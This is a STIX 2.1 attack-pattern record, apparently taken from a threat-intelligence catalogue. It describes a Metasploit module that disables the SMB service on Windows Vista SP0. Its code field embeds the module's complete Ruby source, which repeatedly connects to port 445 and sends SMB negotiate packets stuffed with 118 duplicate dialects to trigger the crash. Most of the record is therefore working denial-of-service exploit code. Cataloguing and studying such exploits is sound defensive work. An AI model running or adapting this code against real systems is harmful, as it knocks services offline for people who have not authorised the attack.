{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1dbde63-bdc9-4257-ac09-c61fa12723df",
    "created": "2024-08-14T16:25:33.810531Z",
    "modified": "2024-08-14T16:25:33.810534Z",
    "name": "Microsoft Vista SP0 SMB Negotiate Protocol DoS",
    "description": " This module exploits a flaw in Windows Vista that allows a remote unauthenticated attacker to disable the SMB service. This vulnerability was silently fixed in Microsoft Vista Service Pack 1.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/vista_negotiate_stop.rb",
            "external_id": "vista_negotiate_stop.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Vista SP0 SMB Negotiate Protocol DoS',\n      'Description'    => %q{\n        This module exploits a flaw in Windows Vista that allows a remote\n      unauthenticated attacker to disable the SMB service. This vulnerability\n      was silently fixed in Microsoft Vista Service Pack 1.\n      },\n\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '64341'],\n        ]\n    ))\n\n    register_options([Opt::RPORT(445)])\n  end\n\n  def run\n\n    print_status(\"Sending 100 negotiate requests...\");\n\n    # 100 requests ensure that the bug is reliably hit\n    1.upto(100) do |i|\n\n      begin\n\n        connect\n\n        # 118 dialects are needed to trigger a non-response\n        dialects = ['NT LM 0.12'] * 118\n\n        data = dialects.collect { |dialect| \"\\x02\" + dialect + \"\\x00\" }.join('')\n\n        pkt = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct\n        pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE\n        pkt['Payload']['SMB'].v['Flags1'] = 0x18\n        pkt['Payload']['SMB'].v['Flags2'] = 0xc853\n        pkt['Payload'].v['Payload'] = data\n        pkt['Payload']['SMB'].v['ProcessID'] = rand(0x10000)\n        pkt['Payload']['SMB'].v['MultiplexID'] = rand(0x10000)\n\n        sock.put(pkt.to_s)\n\n        disconnect\n\n      rescue ::Interrupt\n        raise $!\n\n      rescue ::Exception\n        print_error(\"Error at iteration #{i}: #{$!.class} #{$!}\")\n        return\n      end\n\n    end\n\n  end\nend\n"
}